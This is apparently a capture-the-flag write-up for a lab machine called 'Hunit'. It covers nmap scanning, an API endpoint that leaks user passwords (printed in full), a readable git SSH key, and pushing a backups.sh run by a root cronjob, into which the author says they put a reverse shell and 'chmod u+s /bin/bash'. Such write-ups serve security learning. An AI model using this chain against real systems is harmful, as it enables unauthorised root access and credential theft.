# Hunit

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 3000 -Pn 192.168.183.125
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-12 13:03 +08
Nmap scan report for 192.168.183.125
Host is up (0.17s latency).
Not shown: 65483 filtered tcp ports (no-response), 48 closed tcp ports (conn-refused)
PORT      STATE SERVICE
8080/tcp  open  http-proxy
12445/tcp open  unknown
18030/tcp open  unknown
43022/tcp open  unknown
```

Did a detailed `nmap` scan as well:

```
$ sudo nmap -p 8080,12445,18030,43022 -sC -sV --min-rate 3000 -Pn 192.168.183.125      
[sudo] password for kali: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-12 13:08 +08
Nmap scan report for 192.168.183.125
Host is up (0.17s latency).

PORT      STATE SERVICE     VERSION
8080/tcp  open  http-proxy
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 
|     Content-Type: text/html;charset=UTF-8
|     Content-Language: en-US
|     Content-Length: 3762
|     Date: Wed, 12 Jul 2023 05:08:20 GMT
|     Connection: close
|     <!DOCTYPE HTML>
|     <!--
|     Minimaxing by HTML5 UP
|     html5up.net | @ajlkn
|     Free for personal and commercial use under the CCA 3.0 license (html5up.net/license)
|     <html>
|     <head>
|     <title>My Haikus</title>
|     <meta charset="utf-8" />
|     <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
|     <link rel="stylesheet" href="/css/main.css" />
|     </head>
|     <body>
|     <div id="page-wrapper">
|     <!-- Header -->
|     <div id="header-wrapper">
|     <div class="container">
|     <div class="row">
|     <div class="col-12">
|     <header id="header">
|     <h1><a href="/" id="logo">My Haikus</a></h1>
|     </header>
|     </div>
|     </div>
|     </div>
|     </div>
|     <div id="main">
|     <div clas
|   HTTPOptions: 
|     HTTP/1.1 200 
|     Allow: GET,HEAD,OPTIONS
|     Content-Length: 0
|     Date: Wed, 12 Jul 2023 05:08:20 GMT
|     Connection: close
|   RTSPRequest: 
|     HTTP/1.1 505 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 465
|     Date: Wed, 12 Jul 2023 05:08:20 GMT
|     <!doctype html><html lang="en"><head><title>HTTP Status 505 
|     HTTP Version Not Supported</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 505 
|_    HTTP Version Not Supported</h1></body></html>
|_http-title: My Haikus
12445/tcp open  netbios-ssn Samba smbd 4.6.2
18030/tcp open  http        Apache httpd 2.4.46 ((Unix))
|_http-title: Whack A Mole!
|_http-server-header: Apache/2.4.46 (Unix)
| http-methods: 
|_  Potentially risky methods: TRACE
43022/tcp open  ssh         OpenSSH 8.4 (protocol 2.0)
| ssh-hostkey: 
|   3072 7bfc37b4da6ec58ea98bb780f5cd09cb (RSA)
|   256 89cdea4725d98ff894c3d65cd405bad0 (ECDSA)
|_  256 c07c6f477e94cc8bf83da0a61fa92711 (ED25519)
```

### Web Enum -> API SSH Creds

Port 8080 shows a Haiku page:

<figure><img src="../../../.gitbook/assets/image (2121).png" alt=""><figcaption></figcaption></figure>

If we read go to the first Haiku's page and view the page source, we find this:

<figure><img src="../../../.gitbook/assets/image (2112).png" alt=""><figcaption></figcaption></figure>

We can enumerate the API page using `curl`.&#x20;

```
$ curl http://192.168.183.125:8080/api/ --silent | jq
[
  {
    "string": "/api/",
    "id": 13
  },
  {
    "string": "/article/",
    "id": 14
  },
  {
    "string": "/article/?",
    "id": 15
  },
  {
    "string": "/user/",
    "id": 16
  },
  {
    "string": "/user/?",
    "id": 17
  }
]
```

Using the `/user/?` endpoint gives us credentials for some users:

```
$ curl http://192.168.183.125:8080/api/user/? --silent | jq
[
  {
    "login": "rjackson",
    "password": "yYJcgYqszv4aGQ",
    "firstname": "Richard",
    "lastname": "Jackson",
    "description": "Editor",
    "id": 1
  },
  {
    "login": "jsanchez",
    "password": "d52cQ1BzyNQycg",
    "firstname": "Jennifer",
    "lastname": "Sanchez",
    "description": "Editor",
    "id": 3
  },
  {
    "login": "dademola",
    "password": "ExplainSlowQuest110",
    "firstname": "Derik",
    "lastname": "Ademola",
    "description": "Admin",
    "id": 6
  },
  {
    "login": "jwinters",
    "password": "KTuGcSW6Zxwd0Q",
    "firstname": "Julie",
    "lastname": "Winters",
    "description": "Editor",
    "id": 7
  },
  {
    "login": "jvargas",
    "password": "OuQ96hcgiM5o9w",
    "firstname": "James",
    "lastname": "Vargas",
    "description": "Editor",
    "id": 10
  }
]
```

We can then login using the credentials for `dademola`:

<figure><img src="../../../.gitbook/assets/image (3600).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### Exposed SSH Key -> Git User

There are other users present on this machine:

```
[dademola@hunit home]$ ls -la
total 16
drwxr-xr-x  4 root     root     4096 Nov  5  2020 .
drwxr-xr-x 18 root     root     4096 Nov 10  2020 ..
drwx------  5 dademola dademola 4096 Jan 15  2021 dademola
drwxr-xr-x  4 git      git      4096 Nov  5  2020 git
```

For some reason, the `git` user's `.ssh` file is readable by all:

```
[dademola@hunit git]$ ls -la
total 28
drwxr-xr-x 4 git  git  4096 Nov  5  2020 .
drwxr-xr-x 4 root root 4096 Nov  5  2020 ..
-rw------- 1 git  git     0 Jan 15  2021 .bash_history
-rw-r--r-- 1 git  git    21 Aug  9  2020 .bash_logout
-rw-r--r-- 1 git  git    57 Aug  9  2020 .bash_profile
-rw-r--r-- 1 git  git   141 Aug  9  2020 .bashrc
drwxr-xr-x 2 git  git  4096 Nov  5  2020 .ssh
drwxr-xr-x 2 git  git  4096 Nov  5  2020 git-shell-commands

[dademola@hunit .ssh]$ ls -la
total 20
drwxr-xr-x 2 git  git  4096 Nov  5  2020 .
drwxr-xr-x 4 git  git  4096 Nov  5  2020 ..
-rwxr-xr-x 1 root root  564 Nov  5  2020 authorized_keys
-rwxr-xr-x 1 root root 2590 Nov  5  2020 id_rsa
-rwxr-xr-x 1 root root  564 Nov  5  2020 id_rsa.pub
```

There's also mention of `git-shell-commands`, meaning that we probably need to use this SSH key to perform some Git commands. Using this key, we can `ssh` in to get a Git shell:

```
$ ssh -i git_key git@192.168.183.125 -p 43022
Last login: Wed Jul 12 05:15:03 2023 from 192.168.45.208
git> 
```

### Cronjob -> Git Hijack

I did some enumeration on the machine as `dademola` first, since there wasn't much I could do with a Git shell yet.&#x20;

There was a `git-server` folder present in the `/` directory:

```
[dademola@hunit /]$ ls
bin   dev  git-server  lib    lost+found  opt   root  sbin  sys  usr
boot  etc  home        lib64  mnt         proc  run   srv   tmp  var
```

There was also some mention of a `backups.sh` file being executed periodically as part of a cronjob:

```
[dademola@hunit /]$ cat /etc/crontab.bak
*/3 * * * * /root/git-server/backups.sh
*/2 * * * * /root/pull.sh
```

The `backups.sh` file is also in a `git-server` file of its own, and `pull.sh` is likely pulling changes from...somewhere. Since we have a Git shell, my guess is that we need to use it to submit a malicious PR that changes `backups.sh` to a reverse shell.

To exploit this, let's first clone the repository from the machine:

```
$ GIT_SSH_COMMAND='ssh -i key -p 43022' git clone git@192.168.183.125:/git-server 
Cloning into 'git-server'...
remote: Enumerating objects: 12, done.
remote: Counting objects: 100% (12/12), done.
remote: Compressing objects: 100% (9/9), done.
remote: Total 12 (delta 2), reused 0 (delta 0), pack-reused 0
Receiving objects: 100% (12/12), done.
Resolving deltas: 100% (2/2), done.
```

Here, we can see that `backups.sh` has nothing in it:

```bash
$ cat backups.sh 
#!/bin/bash
#
#
# # Placeholder
#
```

I echoed in a reverse shell and a `chmod u+s /bin/bash`, and then made it executable. Afterwards, I submitted a push request to add the edited `backups.sh` into the repository.

```
$ git add *
$ git commit -m "merge pls"
$ GIT_SSH_COMMAND='ssh -i ../key -p 43022' git push origin master                
Enumerating objects: 5, done.
Counting objects: 100% (5/5), done.
Delta compression using up to 4 threads
Compressing objects: 100% (3/3), done.
Writing objects: 100% (3/3), 375 bytes | 375.00 KiB/s, done.
Total 3 (delta 0), reused 0 (delta 0), pack-reused 0
To 192.168.183.125:/git-server
   b50f4e5..99010a3  master -> master
```

Then, we can just wait for the `cronjob` to execute our reverse shell as `root`:

<figure><img src="../../../.gitbook/assets/image (1000).png" alt=""><figcaption></figcaption></figure>
